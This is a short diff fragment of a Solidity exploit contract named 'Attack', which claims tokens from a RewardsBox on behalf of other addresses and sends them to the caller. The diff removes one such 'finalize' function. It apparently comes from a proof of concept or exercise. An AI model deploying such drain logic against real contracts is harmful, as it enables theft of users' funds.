@@ -18,11 +18,6 @@ contract Attack {
         RewardsBox(rewardsBox).claim(addr, 1e18);
         IERC20(reward).transfer(msg.sender, 1e18);
     }
-
-    function finalize(address accessController, address rewardsBox, address reward) public {
-        RewardsBox(rewardsBox).claim(accessController, 1e18);
-        IERC20(reward).transfer(msg.sender, 1e18);
-    }
 }
 
 contract Payload {
